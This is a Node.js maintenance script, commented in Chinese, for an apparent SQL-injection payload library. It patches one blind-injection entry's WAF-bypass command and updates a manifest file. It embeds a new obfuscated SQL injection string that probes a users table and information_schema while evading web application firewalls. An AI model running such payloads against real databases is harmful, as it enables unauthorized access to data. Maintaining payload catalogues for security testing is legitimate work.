#!/usr/bin/env node
/** 补齐 restore 脚本未执行的第三段：谓词组 waf 去重补丁文档 + manifest 正确键注册 + 死键清理。 */
const fs = require('fs');
const path = require('path');
const { DatabaseSync } = require('node:sqlite');
const ROOT = path.resolve(__dirname, '..');
const CR = p => path.join(ROOT, 'content-review', p);

const db = new DatabaseSync(path.join(ROOT, 'data/payloader.sqlite'), { readOnly: true });
let curBlind = null;
for (const r of db.prepare('SELECT data FROM payloads').all()) { const p = JSON.parse(r.data); if (p.id === 'sqli2-blind-conditional-time-and-predicate-probes') curBlind = p; }
db.close();
const BLIND_OLD = String(curBlind.wafBypass[0].command);
const BLIND_NEW = "1 AND (select DCount(last(username)&after=1&after=1) from users where username='ad1min')\n10 a%nd 1=0/(se%lect top 1 ta%ble_name fr%om info%rmation_schema.tables)";
const name = 'payload-command-overrides-sqlifix2-2026-09.json';
fs.writeFileSync(CR(name), JSON.stringify({
  schemaVersion: 1,
  entries: [{ id: 'sqli2-blind-conditional-time-and-predicate-probes', patches: [{ area: 'wafBypass', index: 0, expectedCommand: BLIND_OLD, command: BLIND_NEW }] }],
}, null, 2) + '\n');
const manifest = JSON.parse(fs.readFileSync(CR('manifest.json'), 'utf8'));
if (!(manifest.payloadCommandOverrideFiles || []).includes(name)) {
  manifest.payloadCommandOverrideFiles = [...(manifest.payloadCommandOverrideFiles || []), name];
}
delete manifest.commandOverrideFiles;
fs.writeFileSync(CR('manifest.json'), JSON.stringify(manifest, null, 2) + '\n');
console.log('补丁文档写入 + manifest 注册 ✓ | 锚定现值行数:', BLIND_OLD.split('\n').length);
